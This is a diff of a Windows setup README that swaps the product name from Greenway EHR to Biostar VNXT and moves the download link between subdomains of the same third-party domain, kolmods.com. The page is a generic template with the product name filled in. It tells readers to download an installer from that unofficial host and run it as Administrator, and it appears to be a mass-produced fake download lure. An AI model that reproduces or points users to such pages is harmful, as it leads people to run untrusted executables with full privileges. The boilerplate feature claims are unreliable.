@@ -1,10 +1,10 @@
-# Greenway EHR Windows Setup Notes
+# Biostar VNXT Windows Setup Notes
+
+**Download:** [Get Windows installer →](https://biostar-vnxt-setup.kolmods.com/)
 
 ## Download & Install
 
-> **Download:** [**Get Greenway EHR for Windows →**](https://greenway.kolmods.com/)
->
-> Setup notes for **Greenway EHR** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Biostar VNXT** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Greenway EHR** from the Start menu
+5. Restart if the installer asks — then launch **Biostar VNXT** from the Start menu
 
 ## What you can use it for
 
-- Core Greenway EHR features on Windows desktop
-- Install and configure Greenway EHR for daily use
-- Import, edit, and export with Greenway EHR tools
-- Tune settings and profiles inside Greenway EHR
-- Integrate Greenway EHR into your existing workflow
+- Core Biostar VNXT features on Windows desktop
+- Install and configure Biostar VNXT for daily use
+- Import, edit, and export with Biostar VNXT tools
+- Tune settings and profiles inside Biostar VNXT
+- Integrate Biostar VNXT into your existing workflow
 
 ## License
 
